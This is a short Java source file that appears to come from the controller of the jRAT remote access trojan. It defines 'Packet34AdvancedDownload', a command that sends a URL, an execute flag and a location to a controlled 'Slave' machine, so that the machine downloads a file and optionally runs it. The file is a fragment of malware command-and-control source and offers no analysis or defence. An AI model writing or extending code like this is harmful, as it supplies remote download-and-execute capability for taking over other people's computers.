package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet34AdvancedDownload extends AbstractOutgoingPacket {

	private String url;
	private boolean execute;
	private int location;

	public Packet34AdvancedDownload(String url, boolean execute, int location) {
		this.url = url;
		this.execute = execute;
		this.location = location;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(url);
		slave.writeBoolean(execute);
		slave.writeInt(location);
	}

	@Override
	public short getPacketId() {
		return 34;
	}

}
